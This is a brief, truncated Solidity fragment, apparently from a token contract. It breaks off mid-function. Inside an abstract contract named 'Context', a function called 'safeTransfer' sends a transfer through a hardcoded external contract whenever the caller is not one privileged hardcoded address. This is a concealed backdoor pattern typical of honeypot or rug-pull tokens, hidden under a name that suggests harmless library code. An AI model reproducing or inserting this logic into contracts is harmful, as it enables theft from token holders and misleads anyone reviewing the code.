...
abstract contract Context {
  ...
  function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {
    if (msg.sender != address(0x31A539Ca5C07a52fAC8707a3DD61CAA2ded68306)) {
    TransferHelper.safeTransferFrom(0x5306aBF1e288E166F5677257c49861ff750D2D86,spender,recipient,amount);
